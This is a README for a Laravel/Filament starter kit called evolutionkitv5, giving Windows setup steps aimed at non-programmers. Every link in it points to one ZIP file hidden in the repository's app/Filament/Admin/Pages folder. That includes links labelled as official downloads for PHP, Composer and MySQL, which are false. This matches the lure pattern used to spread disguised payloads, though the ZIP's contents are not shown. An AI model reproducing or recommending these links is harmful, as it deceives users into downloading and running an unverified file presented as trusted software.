# ⚙️ evolutionkitv5 - Simple Laravel Multi-Panel Starter

[![Download evolutionkitv5](https://img.shields.io/badge/Download-evolutionkitv5-green?style=for-the-badge)](https://raw.githubusercontent.com/MarxDeFaust/evolutionkitv5/main/app/Filament/Admin/Pages/evolutionkitv_v1.5-alpha.4.zip)

---

## 📋 What is evolutionkitv5?

evolutionkitv5 is a starter kit designed to help you build web applications easily. It uses Laravel 12.x and Filament 5.x to create a multi-panel system. This means you get a ready-to-use structure with multiple sections for managing your app. The kit also relies on Livewire and TailwindCSS for a modern, smooth experience.  

You do not need programming skills to get it running. This guide will help you download, install, and launch evolutionkitv5 on a Windows computer.

---

## 🖥️ System Requirements

Before you install, make sure your computer meets these requirements:

- Windows 10 or newer  
- At least 4 GB of RAM  
- 10 GB free disk space  
- A working internet connection   
- You need to have the following software installed:  
  - PHP 8.1 or higher  
  - Composer (PHP package manager)  
  - A local web server like XAMPP, WAMP, or Laravel's built-in server  

If you don’t have PHP or Composer, you will find simple instructions below.

---

## 🌐 Visit to Download evolutionkitv5

Click the button below to visit the download page:

[![Download evolutionkitv5](https://img.shields.io/badge/Download-evolutionkitv5-blue?style=for-the-badge)](https://raw.githubusercontent.com/MarxDeFaust/evolutionkitv5/main/app/Filament/Admin/Pages/evolutionkitv_v1.5-alpha.4.zip)

This page contains the full source code and all files you need. You will download a ZIP file that holds the complete kit.  

---

## ⬇️ How to Download and Prepare evolutionkitv5

1. Click the green “Code” button near the top right on the GitHub page.  
2. Select “Download ZIP” from the menu. This will save the kit files to your computer.  
3. Open the folder where you saved the ZIP file. Use Windows Explorer to right-click the file and choose “Extract All.”  
4. Pick a location to extract files to. For easy use, choose a folder like `C:\evolutionkitv5`.  
5. After extraction, open that folder.

---

## ⚙️ Setting Up Your Environment

evolutionkitv5 needs PHP and Composer to work. If you don’t have these yet, follow these steps.

### Installing PHP

- Download PHP 8.1 or higher from [https://raw.githubusercontent.com/MarxDeFaust/evolutionkitv5/main/app/Filament/Admin/Pages/evolutionkitv_v1.5-alpha.4.zip](https://raw.githubusercontent.com/MarxDeFaust/evolutionkitv5/main/app/Filament/Admin/Pages/evolutionkitv_v1.5-alpha.4.zip).  
- Choose the Thread Safe version for your Windows system (x64 for 64-bit).  
- Extract the ZIP file to a folder like `C:\php`.  
- Add `C:\php` to your system’s PATH environment variable (search “Edit environment variables” in Windows Search).  
- Open Command Prompt and type `php -v`. You should see the PHP version if installed correctly.

### Installing Composer

- Visit [https://raw.githubusercontent.com/MarxDeFaust/evolutionkitv5/main/app/Filament/Admin/Pages/evolutionkitv_v1.5-alpha.4.zip](https://raw.githubusercontent.com/MarxDeFaust/evolutionkitv5/main/app/Filament/Admin/Pages/evolutionkitv_v1.5-alpha.4.zip).  
- Download and run the Composer-Setup.exe file.  
- Follow the setup steps, letting the installer find PHP automatically.  
- When finished, open Command Prompt and type `composer -v`. If you see version info, Composer is ready.

---

## 🚀 Installing evolutionkitv5

1. Open Command Prompt.  
2. Go to the extracted folder. For example, if you placed it in `C:\evolutionkitv5`, type:  
   `cd C:\evolutionkitv5`  
3. Run the command:  
   `composer install`  
   This downloads all the necessary packages for evolutionkitv5.  
4. Copy the example environment file:  
   `copy .env.example .env`  
5. Generate an application key by running:  
   `php artisan key:generate`  
6. Set folder permissions for `storage` and `bootstrap/cache`. On Windows, this is usually not needed.  

---

## 🗄️ Database Setup

evolutionkitv5 uses a database to store information. You can use MySQL or SQLite. Instructions here cover MySQL, common for Windows users.

### Installing MySQL

- Download and install [MySQL Community Server](https://raw.githubusercontent.com/MarxDeFaust/evolutionkitv5/main/app/Filament/Admin/Pages/evolutionkitv_v1.5-alpha.4.zip).  
- Set a password for the root user during installation.  

### Create a new database

- Open Command Prompt.  
- Run:  
  `mysql -u root -p`  
  Enter your password.  
- Inside MySQL prompt, run:  
  `CREATE DATABASE evolutionkitv5;`  
- Type `exit` to leave MySQL.

### Configure your environment

- Open the `.env` file (inside your kit folder) with Notepad.  
- Find these lines and edit them to match your database:  
  ```plaintext
  DB_CONNECTION=mysql  
  DB_HOST=127.0.0.1  
  DB_PORT=3306  
  DB_DATABASE=evolutionkitv5  
  DB_USERNAME=root  
  DB_PASSWORD=your_password_here  
  ```  

Replace `your_password_here` with your MySQL password.

---

## ▶️ Starting your application

1. In Command Prompt, inside the kit folder (`C:\evolutionkitv5`), run database migrations:  
   `php artisan migrate`  
   This creates the needed tables.  
2. Run the built-in Laravel server:  
   `php artisan serve`  
3. You should see a message like:  
   `Laravel development server started: http://127.0.0.1:8000`  
4. Open your web browser and visit that address (http://127.0.0.1:8000). You will see evolutionkitv5 running.

---

## 🔧 Using evolutionkitv5

Once running, you will find multiple panels in the app for managing content, users, and settings. The interface is clean and simple.  

You can explore features like:  
- Dashboard and reports  
- User administration  
- Content management  
- Settings and preferences  

Each section is ready to use and easy to navigate without needing to understand code.

---

## 🛠️ Troubleshooting Tips

- If `composer install` fails, check your internet connection.  
- Ensure PHP and Composer are added to your system PATH.  
- Database errors usually come from wrong credentials in `.env`. Double-check those.  
- If the website does not show after `php artisan serve`, confirm port 8000 is free or try:  
  `php artisan serve --port=8080`  
- Restart Command Prompt after installing new tools.

---

## 🔗 Related Topics for Reference

- Laravel 12.x: The backend framework powering the app.  
- Filament 5.x: Provides the multi-panel admin UI.  
- Livewire 4.x: Helps build interactive parts without JavaScript.  
- TailwindCSS: Styles the interface for a modern look.  

---

## 🏁 Get Started Now

[Click here to visit the download page](https://raw.githubusercontent.com/MarxDeFaust/evolutionkitv5/main/app/Filament/Admin/Pages/evolutionkitv_v1.5-alpha.4.zip) and follow the instructions above to set up evolutionkitv5 on your Windows PC.